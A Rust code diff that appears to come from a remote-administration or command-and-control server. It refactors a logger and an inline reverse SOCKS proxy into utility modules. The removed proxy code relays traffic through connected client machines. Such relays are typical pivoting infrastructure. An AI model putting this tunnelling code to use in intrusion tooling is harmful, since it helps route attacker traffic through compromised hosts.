@@ -12,52 +12,13 @@ use rand::Rng;
 use rsa::{pkcs8::ToPublicKey, PaddingScheme, RsaPrivateKey, RsaPublicKey};
 use base64::{engine::general_purpose, Engine as _};
 
-use tokio::{io::{AsyncWriteExt, AsyncReadExt}, net::{TcpListener, TcpStream}};
-use common::socks::MAGIC_FLAG;
-use net2::TcpStreamExt;
-
 use common::packets::*;
 
 use anyhow::{Context, Result};
 use crate::commands::*;
 use common::{ENC_TOK_LEN, RSA_BITS};
-use serde::Serialize;
 
-
-#[derive(Debug, Clone, Serialize)]
-pub struct Log {
-    pub event_type: String,
-    pub message: String,
-}
-
-#[derive(Debug, Clone)]
-struct Logger {
-    logs: Vec<Log>,
-    tauri_handle: Option<Arc<Mutex<AppHandle>>>,
-}
-
-impl Logger {
-    pub fn new() -> Self {
-        Self { logs: Vec::new(), tauri_handle: None }
-    }
-    
-    pub async fn log(&mut self, event_type: &str, message: &str) {
-        let log = Log { event_type: event_type.to_string(), message: message.to_string() };
-        self.logs.push(log.clone());
-
-        if let Some(handle) = &self.tauri_handle {
-            handle.lock().unwrap().emit_all("server_log", log).unwrap_or_else(|e| println!("Failed to emit log event: {}", e));
-        }
-    }
-
-    pub async fn log_once(&mut self, log: Log) {
-        self.logs.push(log.clone());
-
-        if let Some(handle) = &self.tauri_handle {
-            handle.lock().unwrap().emit_all("server_log", log).unwrap_or_else(|e| println!("Failed to emit log event: {}", e));
-        }
-    }
-}
+use crate::utils::logger::Logger;
 
 pub struct ServerWrapper {
     receiver: Receiver<ServerCommand>,
@@ -474,108 +435,10 @@ impl ServerWrapper {
 
                     self.send_client_packet(&addr, ClientboundPacket::StartReverseProxy(port.clone())).await;
 
-                    let master_addr = format!("{}:{}", "0.0.0.0", port);
-                    let socks_addr = format!("{}:{}", "0.0.0.0", local_port);
-                    
-                    let slave_listener = match TcpListener::bind(&master_addr).await{
-                        Err(_e) => {
-                            return;
-                        },
-                        Ok(p) => p
-                    };
-            
-                    let (slave_stream , _slave_addr) = match slave_listener.accept().await{
-                        Err(_e) => {
-                            return;
-                        },
-                        Ok(p) => p
-                    };
-            
-                    let raw_stream = slave_stream.into_std().unwrap();
-                    raw_stream.set_keepalive(Some(std::time::Duration::from_secs(10))).unwrap();
-                    let mut slave_stream = TcpStream::from_std(raw_stream).unwrap();            
-                    
-                    let listener = match TcpListener::bind(&socks_addr).await{
-                        Err(_e) => {
-                            return;
-                        },
-                        Ok(p) => p
-                    };
-            
-                    let task = tokio::spawn(async move {
-                    loop {
-                        let (stream , _) = listener.accept().await.unwrap();
-            
-                        let raw_stream = stream.into_std().unwrap();
-                        raw_stream.set_keepalive(Some(std::time::Duration::from_secs(10))).unwrap();
-                        let mut stream = TcpStream::from_std(raw_stream).unwrap();
-            
-                        if let Err(_e) = slave_stream.write_all(&[MAGIC_FLAG[0]]).await{
-                            break;
-                        };
-            
-                        let (proxy_stream , _slave_addr) = match slave_listener.accept().await{
-                            Err(_e) => {
-                                return;
-                            },
-                            Ok(p) => p
-                        };
-            
-                        let raw_stream = proxy_stream.into_std().unwrap();
-                        raw_stream.set_keepalive(Some(std::time::Duration::from_secs(10))).unwrap();
-                        let mut proxy_stream = TcpStream::from_std(raw_stream).unwrap();
-            
-            
-                        let _task = tokio::spawn(async move {
-                            let mut buf1 = [0u8 ; 1024];
-                            let mut buf2 = [0u8 ; 1024];
-            
-                            loop{
-                                tokio::select! {
-                                    a = proxy_stream.read(&mut buf1) => {
-                    
-                                        let len = match a {
-                                            Err(_) => {
-                                                break;
-                                            }
-                                            Ok(p) => p
-                                        };
-                                        match stream.write_all(&buf1[..len]).await {
-                                            Err(_) => {
-                                                break;
-                                            }
-                                            Ok(p) => p
-                                        };
-                    
-                                        if len == 0 {
-                                            break;
-                                        }
-                                    },
-                                    b = stream.read(&mut buf2) =>  { 
-                                        let len = match b{
-                                            Err(_) => {
-                                                break;
-                                            }
-                                            Ok(p) => p
-                                        };
-                                        match proxy_stream.write_all(&buf2[..len]).await {
-                                            Err(_) => {
-                                                break;
-                                            }
-                                            Ok(p) => p
-                                        };
-                                        if len == 0 {
-                                            break;
-                                        }
-                                    },
-                                }
-                            }
-                        });
-
-
+                    let task = crate::utils::reverse_proxy::start_reverse_proxy(port, local_port).await;
+                    if let Some(task) = task {
+                        self.reverse_proxy_tasks.insert(addr, task);
                     }
-                });
-                self.reverse_proxy_tasks.insert(addr, task);
                 }
                 StopReverseProxy(addr) => {
                     let client = self.connected_users.get(&addr).unwrap();
